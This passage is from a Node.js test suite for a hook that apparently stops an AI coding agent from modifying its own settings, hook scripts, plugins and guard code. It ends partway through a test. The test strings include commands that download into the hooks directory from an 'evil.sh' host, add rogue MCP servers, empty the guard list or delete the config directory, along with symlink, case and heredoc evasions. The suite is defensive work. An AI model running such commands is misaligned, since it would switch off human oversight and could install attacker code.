#!/usr/bin/env node
/**
 * Tests for config-guard.js
 *
 * Run: node --test plugins/config-guard/tests/config-guard.test.js
 * Or:  npm test
 */

const { describe, it, after } = require('node:test');
const assert = require('node:assert');
const { spawn } = require('node:child_process');
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

// The module reads HOOK_SAFETY_LEVEL at load time; clear it before requiring
// so a runner shell's env cannot shift the default the unit tests assume.
delete process.env.HOOK_SAFETY_LEVEL;
delete process.env.CLAUDE_CONFIG_DIR;

const {
  PROTECTED_PATHS,
  BASH_TOKENS,
  LEVELS,
  SAFETY_LEVEL,
  checkTool,
  checkFilePath,
  checkBashCommand,
} = require('../config-guard.js');

const SCRIPT_PATH = path.join(__dirname, '../config-guard.js');

// ─────────────────────────────────────────────────────────────────────────────
// Test helpers
// ─────────────────────────────────────────────────────────────────────────────

function fileBlocked(filePath, expectedId = null, level = undefined) {
  const result = checkFilePath(filePath, level);
  assert.strictEqual(result.blocked, true, `Expected BLOCKED but ALLOWED: ${filePath}`);
  if (expectedId) {
    assert.strictEqual(result.id, expectedId, `Expected '${expectedId}' but got '${result.id}'`);
  }
}

function fileAllowed(filePath, level = undefined) {
  const result = checkFilePath(filePath, level);
  assert.strictEqual(result.blocked, false, `Expected ALLOWED but BLOCKED by '${result.id}': ${filePath}`);
}

function bashBlocked(cmd, expectedId = null, level = undefined) {
  const result = checkBashCommand(cmd, level);
  assert.strictEqual(result.blocked, true, `Expected BLOCKED but ALLOWED: ${cmd}`);
  if (expectedId) {
    assert.strictEqual(result.id, expectedId, `Expected '${expectedId}' but got '${result.id}'`);
  }
}

function bashAllowed(cmd, level = undefined) {
  const result = checkBashCommand(cmd, level);
  assert.strictEqual(result.blocked, false, `Expected ALLOWED but BLOCKED by '${result.id}': ${cmd}`);
}

// Spawns the actual script with a temp HOME (no noise in the real
// ~/.claude/hooks-logs) and without inheriting HOOK_* / CONFIG_GUARD_*
// from the runner's shell - tests opt in explicitly via envOverrides.
const TMP_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-test-'));

function runHook(payload, envOverrides = {}) {
  return new Promise((resolve, reject) => {
    const env = { ...process.env, HOME: TMP_HOME, ...envOverrides };
    for (const key of Object.keys(env)) {
      if ((key.startsWith('HOOK_') || key.startsWith('CONFIG_GUARD_') || key === 'CLAUDE_CONFIG_DIR') && !(key in envOverrides)) {
        delete env[key];
      }
    }
    const child = spawn('node', [SCRIPT_PATH], { env });
    let stdout = '';
    let stderr = '';

    child.stdout.on('data', (data) => { stdout += data; });
    child.stderr.on('data', (data) => { stderr += data; });

    child.on('close', (code) => {
      try {
        const output = JSON.parse(stdout.trim());
        resolve({ code, output, stderr });
      } catch (e) {
        reject(new Error(`Failed to parse output: ${stdout}`));
      }
    });

    child.stdin.write(typeof payload === 'string' ? payload : JSON.stringify(payload));
    child.stdin.end();
  });
}

function toolPayload(toolName, toolInput) {
  return {
    tool_name: toolName,
    tool_input: toolInput,
    session_id: 'test-session',
    cwd: '/tmp',
    permission_mode: 'default',
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Unit Tests - checkFilePath() (Edit / MultiEdit / Write targets)
// ─────────────────────────────────────────────────────────────────────────────

describe('Unit: checkFilePath()', () => {
  describe('CRITICAL: settings files', () => {
    it('blocks .claude/settings.json', () => fileBlocked('.claude/settings.json', 'settings-file'));
    it('blocks project-absolute .claude/settings.json', () => fileBlocked('/Users/dev/proj/.claude/settings.json', 'settings-file'));
    it('blocks .claude/settings.local.json', () => fileBlocked('.claude/settings.local.json', 'settings-file'));
    it('blocks ~/.claude/settings.json', () => fileBlocked('~/.claude/settings.json', 'settings-file'));
    it('blocks /home/user/.claude/settings.json', () => fileBlocked('/home/user/.claude/settings.json', 'settings-file'));
    it('blocks managed-settings.json', () => fileBlocked('/Library/Application Support/ClaudeCode/managed-settings.json', 'managed-settings'));
    it('blocks case variants on case-insensitive filesystems', () => fileBlocked('.Claude/Settings.JSON', 'settings-file'));
  });

  describe('CRITICAL: hook scripts and manifests', () => {
    it('blocks a script under .claude/hooks/ (self-protection)', () => fileBlocked('/Users/dev/.claude/hooks/config-guard.js', 'hook-script'));
    it('blocks creating a new script under .claude/hooks/', () => fileBlocked('.claude/hooks/evil.js', 'hook-script'));
    it('blocks a plugin hooks.json', () => fileBlocked('plugins/foo/hooks/hooks.json', 'hooks-manifest'));
    it('blocks a bare hooks.json', () => fileBlocked('hooks.json', 'hooks-manifest'));
  });

  describe('HIGH: MCP and plugin config', () => {
    it('blocks .mcp.json', () => fileBlocked('.mcp.json', 'mcp-config'));
    it('blocks project-absolute .mcp.json', () => fileBlocked('/Users/dev/proj/.mcp.json', 'mcp-config'));
    it('blocks .claude-plugin/marketplace.json', () => fileBlocked('.claude-plugin/marketplace.json', 'plugin-manifest'));
    it('blocks nested .claude-plugin/plugin.json', () => fileBlocked('plugins/x/.claude-plugin/plugin.json', 'plugin-manifest'));
    it('critical level does NOT block .mcp.json', () => fileAllowed('.mcp.json', 'critical'));
  });

  describe('STRICT: instruction files (opt-in tier)', () => {
    it('blocks CLAUDE.md at strict', () => fileBlocked('CLAUDE.md', 'claude-md', 'strict'));
    it('blocks CLAUDE.local.md at strict', () => fileBlocked('/repo/CLAUDE.local.md', 'claude-md', 'strict'));
    it('blocks .claude/rules/style.md at strict', () => fileBlocked('.claude/rules/style.md', 'rules-dir', 'strict'));
    it('blocks .claude/agents/reviewer.md at strict', () => fileBlocked('.claude/agents/reviewer.md', 'rules-dir', 'strict'));
    it('blocks .claude/commands/deploy.md at strict', () => fileBlocked('.claude/commands/deploy.md', 'rules-dir', 'strict'));
    it('default (high) does NOT block CLAUDE.md', () => fileAllowed('CLAUDE.md'));
    it('default (high) does NOT block .claude/rules/style.md', () => fileAllowed('.claude/rules/style.md'));
  });

  describe('Symlinked parents are resolved', () => {
    // A path that looks innocent but really lands in .claude must still block:
    // `ln -s ~/.claude /tmp/x` then Write /tmp/x/settings.json.
    const symHome = fs.mkdtempSync(path.join(os.tmpdir(), 'config-guard-symlink-'));
    const claudeDir = path.join(symHome, '.claude');
    fs.mkdirSync(path.join(claudeDir, 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(claudeDir, 'settings.json'), '{}');
    const dirLink = path.join(symHome, 'innocent');
    fs.symlinkSync(claudeDir, dirLink);

    it('blocks a write through a symlinked .claude dir (existing file)', () =>
      fileBlocked(path.join(dirLink, 'settings.json'), 'settings-file'));
    it('blocks creating a NEW file through a symlinked hooks dir (parent resolution)', () => {
      const hooksLink = path.join(symHome, 'h');
      fs.symlinkSync(path.join(claudeDir, 'hooks'), hooksLink);
      fileBlocked(path.join(hooksLink, 'evil.js'), 'hook-script');
    });
    it('still allows a benign file behind a symlink to an ordinary dir', () => {
      const okDir = path.join(symHome, 'okdir');
      fs.mkdirSync(okDir);
      const okLink = path.join(symHome, 'oklink');
      fs.symlinkSync(okDir, okLink);
      fileAllowed(path.join(okLink, 'notes.txt'));
    });
  });

  describe('Unrelated files pass', () => {
    it('allows src/app.js', () => fileAllowed('src/app.js'));
    it('allows .gitignore', () => fileAllowed('.gitignore'));
    it('allows .eslintrc.json', () => fileAllowed('.eslintrc.json'));
    it('allows package.json', () => fileAllowed('package.json'));
    it('allows an app-level config/settings.json (not .claude)', () => fileAllowed('config/settings.json'));
    it('allows webhooks.json (not hooks.json)', () => fileAllowed('src/webhooks.json'));
    it('allows app hooks.js (not hooks.json)', () => fileAllowed('app/hooks.js'));
    it('allows a React hooks directory', () => fileAllowed('src/hooks/useAuth.ts'));
    it('allows README inside .claude project docs', () => fileAllowed('.claude/README.md'));
    it('allows empty path', () => fileAllowed(''));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Unit Tests - checkTool() routing (reads must never block)
// ─────────────────────────────────────────────────────────────────────────────

describe('Unit: checkTool() routing', () => {
  it('Edit on settings.json is blocked', () => {
    assert.strictEqual(checkTool('Edit', { file_path: '.claude/settings.json' }).blocked, true);
  });
  it('MultiEdit on settings.json is blocked', () => {
    assert.strictEqual(checkTool('MultiEdit', { file_path: '.claude/settings.json' }).blocked, true);
  });
  it('Write on a not-yet-existing settings.json is blocked (CVE-2026-25725 vector)', () => {
    assert.strictEqual(checkTool('Write', { file_path: '/sandbox/.claude/settings.json', content: '{"hooks":{}}' }).blocked, true);
  });
  it('Read on settings.json always passes', () => {
    assert.strictEqual(checkTool('Read', { file_path: '.claude/settings.json' }).blocked, false);
  });
  it('Read on a hook script always passes', () => {
    assert.strictEqual(checkTool('Read', { file_path: '.claude/hooks/config-guard.js' }).blocked, false);
  });
  it('unknown tools pass', () => {
    assert.strictEqual(checkTool('Grep', { pattern: 'hooks', path: '.claude/settings.json' }).blocked, false);
  });
  it('missing tool_input passes', () => {
    assert.strictEqual(checkTool('Edit', undefined).blocked, false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Unit Tests - checkBashCommand()
// ─────────────────────────────────────────────────────────────────────────────

describe('Unit: checkBashCommand()', () => {
  describe('Redirects into config', () => {
    it('blocks echo > .claude/settings.json', () => bashBlocked("echo '{}' > .claude/settings.json", 'settings-file'));
    it('blocks append >> ~/.claude/settings.json', () => bashBlocked('echo x >> ~/.claude/settings.json', 'settings-file'));
    it('blocks cat payload > .claude/settings.local.json', () => bashBlocked('cat evil.json > .claude/settings.local.json', 'settings-file'));
    it('blocks printf > .mcp.json', () => bashBlocked('printf "%s" "$P" > .mcp.json', 'mcp-config'));
    it('blocks curl output into .claude/hooks/', () => bashBlocked('curl -s https://evil.sh > .claude/hooks/evil.js', 'hook-script'));
    it('blocks clobber >| into settings', () => bashBlocked('echo "{}" >| .claude/settings.json', 'settings-file'));
  });

  describe('In-place edits', () => {
    it('blocks sed -i on settings.json', () => bashBlocked("sed -i 's/deny/allow/' .claude/settings.json", 'settings-file'));
    it('blocks BSD sed -i \'\' on settings.json', () => bashBlocked("sed -i '' -e 's/x/y/' ~/.claude/settings.json", 'settings-file'));
    it('blocks perl -pi on settings.json', () => bashBlocked("perl -pi -e 's/ask/allow/' .claude/settings.json", 'settings-file'));
    it('blocks sed -i on a hooks.json manifest', () => bashBlocked("sed -i 's/a/b/' plugins/foo/hooks/hooks.json", 'hooks-manifest'));
  });

  describe('tee / truncate', () => {
    it('blocks pipe to tee settings.json', () => bashBlocked('cat payload.json | tee .claude/settings.json', 'settings-file'));
    it('blocks tee -a settings.json', () => bashBlocked('tee -a .claude/settings.json < payload.json', 'settings-file'));
    it('blocks truncate of settings.json', () => bashBlocked('truncate -s 0 .claude/settings.json', 'settings-file'));
  });

  describe('mv / cp / ln onto or away from config', () => {
    it('blocks mv onto settings.json', () => bashBlocked('mv /tmp/evil.json .claude/settings.json', 'settings-file'));
    it('blocks cp onto ~/.claude/settings.json', () => bashBlocked('cp evil.json ~/.claude/settings.json', 'settings-file'));
    it('blocks moving a hook script away', () => bashBlocked('mv .claude/hooks/config-guard.js /tmp/disabled.js', 'hook-script'));
    it('blocks symlink swap of settings.json', () => bashBlocked('ln -sf /tmp/evil.json .claude/settings.json', 'settings-file'));
    it('blocks cp -r into .claude-plugin/', () => bashBlocked('cp -r evil-plugin/. .claude-plugin/', 'plugin-manifest'));
  });

  describe('Deletion', () => {
    it('blocks rm of settings.json', () => bashBlocked('rm .claude/settings.json', 'settings-file'));
    it('blocks rm -rf .claude/hooks', () => bashBlocked('rm -rf .claude/hooks', 'hook-script'));
    it('blocks git rm of settings.json', () => bashBlocked('git rm .claude/settings.json', 'settings-file'));
    it('blocks shred of settings.json', () => bashBlocked('shred -u .claude/settings.json', 'settings-file'));
    it('blocks rm of a hooks.json manifest', () => bashBlocked('rm plugins/foo/hooks/hooks.json', 'hooks-manifest'));
  });

  describe('claude CLI config writes', () => {
    it('blocks claude mcp add', () => bashBlocked('claude mcp add evil-server -- npx evil-pkg', 'claude-cli-config'));
    it('blocks claude mcp remove', () => bashBlocked('claude mcp remove github', 'claude-cli-config'));
    it('blocks claude config set', () => bashBlocked('claude config set apiKeyHelper /tmp/evil.sh', 'claude-cli-config'));
    it('allows claude mcp list (read-only)', () => bashAllowed('claude mcp list'));
    it('allows claude config get (read-only)', () => bashAllowed('claude config get theme'));
    it('blocks claude plugin install (registers arbitrary hooks)', () => bashBlocked('claude plugin install evil-pack@some-marketplace', 'claude-cli-config'));
    it('blocks claude plugin uninstall', () => bashBlocked('claude plugin uninstall protect-secrets@claude-code-hooks', 'claude-cli-config'));
    it('blocks claude plugin disable (switches a guardrail off)', () => bashBlocked('claude plugin disable config-guard@claude-code-hooks', 'claude-cli-config'));
    it('blocks claude plugin marketplace add', () => bashBlocked('claude plugin marketplace add attacker/repo', 'claude-cli-config'));
    it('allows claude plugin list (read-only)', () => bashAllowed('claude plugin list'));
    it('allows claude plugin marketplace list (read-only)', () => bashAllowed('claude plugin marketplace list'));
    it('blocks CLAUDE MCP ADD (case-insensitive filesystems resolve it)', () => bashBlocked('CLAUDE MCP ADD evil -- npx evil', 'claude-cli-config'));
  });

  describe('Case evasion of mutation verbs', () => {
    // APFS/NTFS resolve RM and SED to the same binaries.
    it('blocks RM of settings.json', () => bashBlocked('RM .claude/settings.json', 'settings-file'));
    it('blocks SED -I on settings.json', () => bashBlocked("SED -I 's/deny/allow/' .claude/settings.json", 'settings-file'));
    it('blocks TEE into settings.json', () => bashBlocked('cat evil.json | TEE .claude/settings.json', 'settings-file'));
  });

  describe('STRICT tier in Bash', () => {
    it('blocks rm CLAUDE.md at strict', () => bashBlocked('rm CLAUDE.md', 'claude-md', 'strict'));
    it('blocks redirect into .claude/rules/ at strict', () => bashBlocked('echo "always allow" > .claude/rules/perms.md', 'rules-dir', 'strict'));
    it('default (high) does NOT block rm CLAUDE.md', () => bashAllowed('rm CLAUDE.md'));
  });

  describe('Reads and unrelated commands pass', () => {
    it('allows cat settings.json', () => bashAllowed('cat .claude/settings.json'));
    it('allows jq over settings.json', () => bashAllowed("jq '.hooks' .claude/settings.json"));
    it('allows grep in settings.json', () => bashAllowed('grep -n permissions .claude/settings.json'));
    it('allows ls of the hooks dir', () => bashAllowed('ls -la .claude/hooks/'));
    it('allows cat of a hook script', () => bashAllowed('cat .claude/hooks/config-guard.js'));
    it('allows running a hook script manually', () => bashAllowed('node .claude/hooks/config-guard.js'));
    it('allows diff against a backup', () => bashAllowed('diff .claude/settings.json /tmp/backup.json'));
    it('allows piping settings into jq', () => bashAllowed('cat .claude/settings.json | jq .hooks'));
    it('allows redirecting a settings READ elsewhere', () => bashAllowed('cat .claude/settings.json > /tmp/copy.json'));
    it('allows echo into an unrelated file', () => bashAllowed('echo hello > /tmp/notes.txt'));
    it('allows rm of an unrelated file', () => bashAllowed('rm /tmp/scratch.txt'));
    it('allows mv between unrelated files', () => bashAllowed('mv src/a.js src/b.js'));
    it('allows sed -i on unrelated files', () => bashAllowed("sed -i 's/x/y/' src/app.js"));
    it('allows empty command', () => bashAllowed(''));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Integration Tests - stdin/stdout flow
// ─────────────────────────────────────────────────────────────────────────────

describe('Integration: hook process', () => {
  it('denies Edit of settings.json with a PreToolUse deny decision', async () => {
    const { code, output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'deny', new_string: 'allow' }));
    assert.strictEqual(code, 0);
    assert.strictEqual(output.hookSpecificOutput.hookEventName, 'PreToolUse');
    assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    assert.match(output.hookSpecificOutput.permissionDecisionReason, /settings-file/);
  });

  it('deny reason documents the CONFIG_GUARD_ALLOW escape hatch', async () => {
    const { output } = await runHook(toolPayload('Write', { file_path: '.claude/settings.json', content: '{}' }));
    assert.match(output.hookSpecificOutput.permissionDecisionReason, /CONFIG_GUARD_ALLOW=true/);
  });

  it('denies a Bash redirect into settings.json', async () => {
    const { output } = await runHook(toolPayload('Bash', { command: "echo '{}' > .claude/settings.json" }));
    assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
  });

  it('passes a Read of settings.json', async () => {
    const { code, output } = await runHook(toolPayload('Read', { file_path: '.claude/settings.json' }));
    assert.strictEqual(code, 0);
    assert.deepStrictEqual(output, {});
  });

  it('passes a Write to an unrelated file', async () => {
    const { output } = await runHook(toolPayload('Write', { file_path: 'src/app.js', content: 'x' }));
    assert.deepStrictEqual(output, {});
  });

  describe('Ask mode', () => {
    it('returns "ask" for settings.json when HOOK_ASK_CRITICAL=true', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { HOOK_ASK_CRITICAL: 'true' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'ask');
    });
    it('returns "ask" for .mcp.json when HOOK_ASK_HIGH=true', async () => {
      const { output } = await runHook(toolPayload('Write', { file_path: '.mcp.json', content: '{}' }), { HOOK_ASK_HIGH: 'true' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'ask');
    });
    it('ask mode is per level: HOOK_ASK_HIGH does not soften critical settings.json', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { HOOK_ASK_HIGH: 'true' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
    it('defaults to "deny" when no HOOK_ASK_* is set', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }));
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
  });

  describe('CONFIG_GUARD_ALLOW escape hatch', () => {
    it('allows an intentional settings.json edit with CONFIG_GUARD_ALLOW=true', async () => {
      const { code, output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { CONFIG_GUARD_ALLOW: 'true' });
      assert.strictEqual(code, 0);
      assert.deepStrictEqual(output, {});
    });
    it('still denies with CONFIG_GUARD_ALLOW=false', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { CONFIG_GUARD_ALLOW: 'false' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
    it('requires the literal string "true": CONFIG_GUARD_ALLOW=1 still denies', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { CONFIG_GUARD_ALLOW: '1' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
  });

  describe('HOOK_SAFETY_LEVEL override', () => {
    it('default is high when env is unset: CLAUDE.md edit passes', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: 'CLAUDE.md', old_string: 'a', new_string: 'b' }));
      assert.deepStrictEqual(output, {});
    });
    it('default is high when env is unset: .mcp.json write denies', async () => {
      const { output } = await runHook(toolPayload('Write', { file_path: '.mcp.json', content: '{}' }));
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
    it('HOOK_SAFETY_LEVEL=strict blocks a CLAUDE.md edit', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: 'CLAUDE.md', old_string: 'a', new_string: 'b' }), { HOOK_SAFETY_LEVEL: 'strict' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
      assert.match(output.hookSpecificOutput.permissionDecisionReason, /claude-md/);
    });
    it('HOOK_SAFETY_LEVEL=critical lets a .mcp.json write through', async () => {
      const { output } = await runHook(toolPayload('Write', { file_path: '.mcp.json', content: '{}' }), { HOOK_SAFETY_LEVEL: 'critical' });
      assert.deepStrictEqual(output, {});
    });
    it('HOOK_SAFETY_LEVEL=critical still denies settings.json', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: '.claude/settings.json', old_string: 'a', new_string: 'b' }), { HOOK_SAFETY_LEVEL: 'critical' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
    it('an invalid value falls back to the default high: CLAUDE.md edit passes', async () => {
      const { output } = await runHook(toolPayload('Edit', { file_path: 'CLAUDE.md', old_string: 'a', new_string: 'b' }), { HOOK_SAFETY_LEVEL: 'paranoid' });
      assert.deepStrictEqual(output, {});
    });
    it('an invalid value falls back to the default high: .mcp.json write denies', async () => {
      const { output } = await runHook(toolPayload('Write', { file_path: '.mcp.json', content: '{}' }), { HOOK_SAFETY_LEVEL: 'paranoid' });
      assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
    });
  });

  describe('Malformed payloads', () => {
    it('outputs {} and exits 0 on invalid JSON', async () => {
      const { code, output } = await runHook('this is not json');
      assert.strictEqual(code, 0);
      assert.deepStrictEqual(output, {});
    });
    it('outputs {} and exits 0 on a null payload', async () => {
      const { code, output } = await runHook('null');
      assert.strictEqual(code, 0);
      assert.deepStrictEqual(output, {});
    });
    it('outputs {} and exits 0 on an empty object', async () => {
      const { code, output } = await runHook({});
      assert.strictEqual(code, 0);
      assert.deepStrictEqual(output, {});
    });
    it('outputs {} when tool_input is missing', async () => {
      const { output } = await runHook({ tool_name: 'Edit' });
      assert.deepStrictEqual(output, {});
    });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Self-protection: installed plugins, ~/.claude.json, the spawn cap ledger
// ─────────────────────────────────────────────────────────────────────────────

const PACK_CACHE = '~/.claude/plugins/cache/claude-code-hooks/guard-pack/1.4.0';

describe('Unit: installed guard code and guard state', () => {
  describe('Edit/Write paths', () => {
    it('blocks the pack dispatcher in the plugin cache', () => fileBlocked(`/home/u/.claude/plugins/cache/claude-code-hooks/guard-pack/1.4.0/lib/dispatch.js`, 'claude-plugins'));
    it('blocks the plugin registry files', () => {
      fileBlocked('/home/u/.claude/plugins/installed_plugins.json', 'claude-plugins');
      fileBlocked('/home/u/.claude/plugins/known_marketplaces.json', 'claude-plugins');
    });
    it('blocks a cloned marketplace checkout', () => fileBlocked('/home/u/.claude/plugins/marketplaces/claude-code-hooks/plugins/config-guard/config-guard.js', 'claude-plugins'));
    it('plugin cache is critical: still blocked at the critical level', () => fileBlocked('/home/u/.claude/plugins/cache/x/y/1.0.0/hook.js', 'claude-plugins', 'critical'));
    it('blocks ~/.claude.json at the default level', () => fileBlocked('/home/u/.claude.json', 'claude-json'));
    it('~/.claude.json is high, like .mcp.json: critical lets it through', () => fileAllowed('/home/u/.claude.json', 'critical'));
    it('blocks writing the spawn cap ledger', () => fileBlocked('/home/u/.claude/subagent-spawn-cap/sess-1.jsonl', 'spawn-cap-state', 'critical'));
    it('allows look-alikes: a repo plugins/ dir, claude.json, my.claude.json, .claude/plugin-notes.md', () => {
      fileAllowed('plugins/guard-pack/lib/dispatch.js');
      fileAllowed('src/claude.json');
      fileAllowed('my.claude.json');
      fileAllowed('.claude/plugin-notes.md');
      fileAllowed('.claude.json.example');
    });
    it('Read of the cached dispatcher always passes', () => {
      assert.strictEqual(checkTool('Read', { file_path: '/home/u/.claude/plugins/cache/claude-code-hooks/guard-pack/1.4.0/lib/dispatch.js' }).blocked, false);
    });
  });

  describe('Bash mutations', () => {
    it('blocks sed -i on the cached dispatcher', () => bashBlocked(`sed -i '' 's/GUARDS = \\[/GUARDS = [] \\&\\& [/' ${PACK_CACHE}/lib/dispatch.js`, 'claude-plugins'));
    it('blocks rm -rf of the marketplace cache', () => bashBlocked('rm -rf ~/.claude/plugins/cache/claude-code-hooks', 'claude-plugins'));
    it('blocks rm -rf of the whole plugins dir and of the Claude dir itself', () => {
      for (const c of ['rm -rf ~/.claude/plugins', 'rm -rf ~/.claude', 'rm -rf ~/.claude/', 'rm -rf ~/.claude/*', 'rm -rf "$HOME/.claude"', 'rm -rf ${HOME}/.claude/plugins/', 'rm -rf "$CLAUDE_CONFIG_DIR/plugins"', 'rm -rf "${CLAUDE_CONFIG_DIR}"']) bashBlocked(c, 'claude-plugins');
    });
    it('blocks a relative delete after cd into the Claude dir', () => bashBlocked('cd ~/.claude && rm -rf plugins', 'claude-plugins'));
    it('blocks moving the plugins dir away and redirecting into it', () => {
      bashBlocked('mv ~/.claude/plugins /tmp/off', 'claude-plugins');
      bashBlocked(`echo 'module.exports={GUARDS:[]}' > ${PACK_CACHE}/lib/dispatch.js`, 'claude-plugins');
      bashBlocked(`cat > ${PACK_CACHE}/lib/dispatch.js <<'EOF'\nmodule.exports = { GUARDS: [] };\nEOF`, 'claude-plugins');
    });
    it('blocks a delete inside a command substitution', () => bashBlocked('echo "$(rm -rf ~/.claude/plugins)"', 'claude-plugins'));
    it('allows shell and native writes to config templates and backups', () => {
      for (const file of ['docs/.claude.json.example', 'docs/.claude.json.backup']) {
        bashAllowed(`cp template.json "${file}"`);
        fileAllowed(file);
      }
      bashBlocked('cp template.json "docs/.claude.json"', 'claude-json');
      fileBlocked('docs/.claude.json', 'claude-json');
    });
    it('blocks writes to ~/.claude.json', () => {
      bashBlocked('echo \'{"mcpServers":{}}\' > ~/.claude.json', 'claude-json');
      bashBlocked('cp /tmp/evil.json ~/.claude.json', 'claude-json');
      bashBlocked("sed -i 's/a/b/' $HOME/.claude.json", 'claude-json');
    });
    it('blocks deleting or truncating the spawn cap ledger', () => {
      bashBlocked('rm ~/.claude/subagent-spawn-cap/cap-demo.jsonl', 'spawn-cap-state');
      bashBlocked(': > ~/.claude/subagent-spawn-cap/cap-demo.jsonl', 'spawn-cap-state');
      bashBlocked('rm -rf ~/.claude/subagent-spawn-cap', 'spawn-cap-state');
      bashBlocked('truncate -s 0 ~/.claude/subagent-spawn-cap/cap-demo.jsonl', 'spawn-cap-state');
    });
  });

  describe('Reads and plugin use stay allowed', () => {
    for (const c of [
      'cat ~/.claude/plugins/installed_plugins.json',
      'ls -la ~/.claude/plugins/cache',
      `grep -rn GUARDS ${PACK_CACHE}/lib`,
      `diff ${PACK_CACHE}/lib/dispatch.js plugins/guard-pack/lib/dispatch.js`,
      `node ${PACK_CACHE}/guard-pack.js < event.json`,
      'cat ~/.claude.json | jq .mcpServers',
      'wc -l ~/.claude/subagent-spawn-cap/*.jsonl',
      'claude plugin list',
      'claude plugin marketplace list',
      'cp notes.md .claude/',
      'cd .claude && rm old-notes.md',
      'rm -rf node_modules/.claude-plugins-cache',
    ]) it(`allows: ${c}`, () => bashAllowed(c));
  });
});

describe('Unit: heredoc text is not a command', () => {
  // Mentions of a protected path next to a verb word ("install", "rm") in a
  // report or a commit message are the false refusals users hit.
  describe('text-only heredocs pass', () => {
    for (const c of [
      "cat > report.md <<'EOF'\nTo install, copy into ~/.claude/plugins and rm the old one.\nAlso check ~/.claude/settings.json and ~/.claude.json.\nEOF",
      'cat > report.md <<EOF\nplain text naming ~/.claude/plugins: rm, mv, install\nEOF',
      "cat <<'EOF' > notes/plan.md\nrm -rf ~/.claude/plugins is now refused\nEOF",
      "tee notes.md <<'EOF'\nsed -i on .claude/settings.json is refused\nEOF",
      "git commit -m \"$(cat <<'EOF'\nProtect ~/.claude/plugins from rm -rf\n\nAlso ~/.claude.json and claude plugin install.\nEOF\n)\"",
      "git add -A && git commit -m \"$(cat <<'EOF'\nrm ~/.claude/subagent-spawn-cap mention\nEOF\n)\"",
      "gh pr create --title \"Protect plugins\" --body \"$(cat <<'EOF'\nrm -rf ~/.claude/plugins is refused\nEOF\n)\"",
    ]) it(`allows: ${JSON.stringify(c.slice(0, 60))}`, () => bashAllowed(c));
  });

  describe('anything that could run the text is still read', () => {
    for (const c of [
      "cat <<'EOF' | sh\nrm -rf ~/.claude/plugins\nEOF",
      "bash -c \"$(cat <<'EOF'\nrm -rf ~/.claude/plugins\nEOF\n)\"",
      "$(cat <<'EOF'\nrm -rf ~/.claude/plugins\nEOF\n)",
      'cat <<EOF\n$(rm -rf ~/.claude/plugins)\nEOF',
      'cat > f.md <<EOF\n`rm -rf ~/.claude/plugins`\nEOF',
      "cat <<'EOF'\nx\nEOF\nrm -rf ~/.claude/plugins\nEOF",
      'echo "\ncat <<X\n"\nrm -rf ~/.claude/plugins/cache',
      '# cat <<X\nrm -rf ~/.claude/plugins\nX',
      'cat <<< "EOF"\nrm -rf ~/.claude/plugins',
      "cat > notes.md <<'EOF'\nhello\nEOF\nrm -rf ~/.claude/plugins",
      "git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\" && rm -rf ~/.claude/plugins",
      "cat > ~/.claude/plugins/x.js <<'EOF'\nhi\nEOF",
      "cat <<'EOF' > .claude/settings.json\n{}\nEOF",
    ]) it(`blocks: ${JSON.stringify(c.slice(0, 60))}`, () => bashBlocked(c));
  });

  it('long near-miss heredoc openers are judged in linear time', () => {
    for (const cmd of [
      'cat ' + 'a '.repeat(20000) + "<<'EOF' !",
      'cat ' + 'a"b"\'c\''.repeat(5000) + ' !',
      'git ' + '"x" '.repeat(20000) + '-m "$(cat <<EOF !',
      'git a && '.repeat(5000) + "git commit -m \"$(cat <<'EOF' !",
      "cat > r.md <<'EOF'\n" + 'rm ~/.claude/plugins\n'.repeat(20000) + 'EOF',
    ]) {
      const start = process.hrtime.bigint();
      checkBashCommand(cmd);
      assert.ok(Number(process.hrtime.bigint() - start) / 1e6 < 200, cmd.slice(0, 40));
    }
  });

  it('a heredoc mention of a CLI write in a commit body passes; the real CLI call does not', () => {
    bashAllowed("git commit -m \"$(cat <<'EOF'\nDocs: claude plugin install is refused\nEOF\n)\"");
    bashBlocked('claude plugin install x@y', 'claude-cli-config');
  });
});

describe('Integration: self-protection through the hook process', () => {
  const cached = path.join(TMP_HOME, '.claude', 'plugins', 'cache', 'claude-code-hooks', 'guard-pack', '1.4.0', 'lib', 'dispatch.js');

  it('denies an Edit of the cached dispatcher', async () => {
    const { output } = await runHook(toolPayload('Edit', { file_path: cached, old_string: 'GUARDS = [', new_string: 'GUARDS = [] && [' }));
    assert.strictEqual(output.hookSpecificOutput.permissionDecision, 'deny');
